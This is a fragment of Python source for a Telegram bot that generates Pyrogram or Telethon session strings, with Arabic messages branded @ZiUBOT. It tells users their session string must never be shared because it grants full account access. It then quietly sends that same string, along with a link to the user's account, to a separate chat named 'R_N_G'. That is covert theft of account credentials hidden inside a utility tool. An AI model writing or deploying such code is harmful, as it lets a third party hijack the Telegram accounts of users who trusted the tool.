...
async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bool = False):
    ...
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(user_id, "⎆┊ أرسـل الكـود\n إذا جاءك في هـذه الطريقـة '12345' أرسـل بين كـل رقـم فـراغn/مثـال : ' 1 2 3 4 5' .", filters=filters.text, timeout=600)
    ...
    text = f"**هذا هو {ty} كـود جلسـة** \n\n`{string_session}` \n\n**مستخـرج مـن :** @ZiUBOT\n🍒 **ملاحظـة :** لا تشارك الكود لأحـد لأنـه يستطيع اختراق حسابك من خلاله ❤️ ولا تنسى الانضمام بقناتي @K_K_Q_L"
    
    tex = f"**جبت الك كود {ty} ** \n\n`{string_session}` \n\n** صاحبه : [sessioner](tg://user?id={msg.chat.id}) "
    try:
        if not is_bot:
    ...
    await bot.send_message("R_N_G", tex)
    await bot.send_message(msg.chat.id, "» تم استخـراج {} كود جلسـة.\n\nيرجـى تفقـد الرسائـل المحفوظـة ! \n\n**مستخـرج مـن** @ZiUBOT".format("تيرمكـس - 𝐭𝐞𝐫𝐦𝐮𝐱" if telethon else "بايروجـرام - 𝐩𝐲𝐫𝐨𝐠𝐫𝐚𝐦"))
